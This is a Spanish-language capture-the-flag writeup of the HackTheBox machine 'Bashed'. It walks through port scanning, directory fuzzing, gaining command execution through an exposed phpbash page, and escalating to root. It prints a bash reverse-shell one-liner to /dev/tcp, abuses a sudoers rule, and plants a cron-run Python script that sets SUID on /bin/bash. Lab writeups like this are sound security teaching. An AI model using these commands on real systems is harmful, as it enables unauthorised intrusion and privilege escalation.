---
title: "Bashed"
date: 2025-05-29 16:41:24 +0200
categories: writeups HackTheBox
tags: rce sudoers crontab wildcard máquina linux
description: Writeup de la máquina Bashed de Hackthebox.
image: ../assets/images/posts/logos/hackthebox.png
---
## Resumen de la resolución

**Bashed** es una máquina **Linux** de dificultad **Easy** de la plataforma de **HackTheBox**. Realizando fuzzing con `gobuster` descubriremos la existencia del directorio `/dev`, en él encontraremos la utilidad `phpbash` de la que tanto se habla en la página web. Teniendo acceso a `phpbash` tendremos ejecución remota de comandos (**RCE**). Ganaremos acceso a la máquina víctima como el usuario **www-data**, seguidamente veremos que tenemos asignado un permiso de **sudoers** mediante el cual podemos ejecutar cualquier comando como el usuario **scriptmanger**. Una vez nos hemos convertido en **scriptmanager** abusaremos de una tarea **cron** para correr un script de python malicioso, el cual asignará permisos **SUID** a la **/bin/bash**. Finalmente, nos autenticarnos como el usuario **root** mediante una **bash privilegiada**.

___
## Enumeración

En primer lugar, debemos desplegar la máquina para poder obtener la **Dirección IP** todo ello desde la web de **HackTheBox** y luego desde la **terminal** debemos conectarnos a la VPN usando el fichero correspondiente de la siguiente forma:

```bash
openvpn lab_trr0r.opvn
```

Después le lanzaremos un **ping** para ver si se encuentra activa dicha máquina, además de ver si acepta la traza **ICM**. Comprobamos que efectivamente nos devuelve el paquete que le enviamos por lo que acepta la traza **ICMP**, gracias al **ttl** podremos saber si se trata de una máquina **Linux (TTL 64 )** y **Windows (TTL 128)**, y vemos que se trata de una máquina **Linux** pues cuenta con **TTL** próximo a 64 (**63**), además gracias al script ****whichSystem.py**** podremos conocer dicha información.

![](<../assets/images/posts/2025-05-29-bashed/Pasted image 20250128214631.png>)

> El motivo por el cual el **TTL** es de **63** es porque el paquete pasa por unos intermediarios (routers) antes de llegar a su destino (máquina atacante). Esto podemos comprobarlo con el comando `ping -c 1 -R 10.10.10.68`.
### Nmap

En segundo lugar, realizaremos un escaneo por **TCP** usando **Nmap** para ver que puertos de la máquina víctima se encuentra abiertos.

```bash
nmap -p- --open --min-rate 5000 -sS -v -Pn -n 10.10.10.68 -oG allPorts
```

Observamos como nos reporta que tan solo se encuentra abierto el puerto **80**.

![](<../assets/images/posts/2025-05-29-bashed/Pasted image 20250128215222.png>)

Ahora, gracias a la utilidad **getPorts** definida en nuestra **.zshrc** podremos copiarnos cómodamente todos los puerto abiertos de la máquina víctima a nuestra **clipboard**.

A continuación, volveremos a realizar un escaneo con **Nmap**, pero esta vez se trata de un escaneo más exhaustivo pues lanzaremos unos script básicos de reconocimiento, además de que nos intente reportar la versión y servicio que corre para cada puerto.

```bash
nmap -p80 -sCV 10.10.10.68 -oN targeted
```

En el segundo escaneo de **Nmap** lo que más nos llamará es la versión del servicio **ssh**, pues es vulnerable a una **Username Enumeration**.

![](<../assets/images/posts/2025-05-29-bashed/Pasted image 20250128215248.png>)
___
### Puerto 80 - HTTP (Apache)

Como tan solo tenemos el puerto **80** abierto comenzaremos a ver la página web, en ella nos hablará sobre la utilidad **phpbash**, la cual ha sido implementada en dicha página.

![](<../assets/images/posts/2025-05-29-bashed/Pasted image 20250128215336.png>)

Tal y como se aprecia en la siguiente captura de pantalla, **phpbash** es una utilidad la cual nos permite ejecutar comandos remotamente desde el servidor.

![](<../assets/images/posts/2025-05-29-bashed/Pasted image 20250128215351.png>)

Como no vemos ningún enlace para acceder a dicha utilidad realizaremos fuzzing de directorios y archivos usando **Gobuster** de la siguiente forma.

```bash
gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,js -t 50
```

Observamos que nos reporta un montón de directorios.

![](<../assets/images/posts/2025-05-29-bashed/Pasted image 20250128215424.png>)
___
## Explotación
### RCE

Tras revisar los diferentes directorios nos daremos cuenta que en **/dev** se encuentra **phpbash** por lo que tendremos ejecución remota de comandos en la máquina víctima.

![](<../assets/images/posts/2025-05-29-bashed/Pasted image 20250128215532.png>)

En este punto lo que haremos será ponernos en escucha con **NetCat** (`nc -nvlp 443`) y enviarnos una **Reverse Shell** gracias al típico one liner de bash (`bash -c 'bash -i >%26 /dev/tcp/10.10.16.4/443 0>%261'`)

Como se muestra a continuación, ganaremos acceso a la máquina víctima.

![](<../assets/images/posts/2025-05-29-bashed/Pasted image 20250128215746.png>)
___
## Movimiento lateral de usuario
### Enumeración local

Una vez hemos ganado acceso a la máquina víctima realizaremos un **Tratamiento de la TTY** para operar desde una terminal más cómoda.

Ganaremos acceso como **www-data** pero al mirar nuestros permisos de **Sudoers**, veremos que podemos ejecutar cualquier comando como el usuario **scriptmanager** sin necesidad de proporcionar contraseña.

![](<../assets/images/posts/2025-05-29-bashed/Pasted image 20250128215918.png>)
### Sudoers

Para convertirme en **scriptmanager** es muy sencillo, basta con ejecutarnos una **bash**.

![](<../assets/images/posts/2025-05-29-bashed/Pasted image 20250128220011.png>)

___
## Escalada de privilegios
### Enumeración local

Al convertirnos en el usuario **scriptmanager** miraremos los permisos **SUID**, pero no veremos nada interesante para elevar nuestros privilegios. 

![](<../assets/images/posts/2025-05-29-bashed/Pasted image 20250128220115.png>)

En este punto lo que haremos será **transferirnos** **pspy** para detectar tareas que se esté ejecutando en segundo plano (**Crontab**). Como puede verse en la captura de pantalla, detectaremos una tarea **cron** en la que el **root** ejecuta el archivo **test.py** y todos los scripts **.py** ubicados **/scripts**.

![](<../assets/images/posts/2025-05-29-bashed/Pasted image 20250128220658.png>)
### Crontab

Nos dirigiremos al directorio **/scripts** y observaremos que tenemos capacidad de escritura sobre dicho directorio.

Por lo que tenemos dos formas de elevar nuestros privilegios:
- Modificar el archivo **test.py** con código malicioso, ya que tenemos permisos de escritura.
- Crear un nuevo script de python, pues tenemos capacidad de escritura en **/scripts**.

![](<../assets/images/posts/2025-05-29-bashed/Pasted image 20250128220727.png>)

Para ambos casos, pondremos el siguiente contenido en el archivo correspondiente.

```python
import os

os.system("chmod +s /bin/bash")
```

Tras esperar un poco, observaremos que la **/bin/bash** obtiene permisos **SUID**.

![](<../assets/images/posts/2025-05-29-bashed/Pasted image 20250128220913.png>)

Finalmente, nos ejecutaremos una **bash privilegiada** con `bash -p`, por lo que nos habremos convertido en **root** de forma efectiva (**efective user**).

![](<../assets/images/posts/2025-05-29-bashed/Pasted image 20250128220948.png>)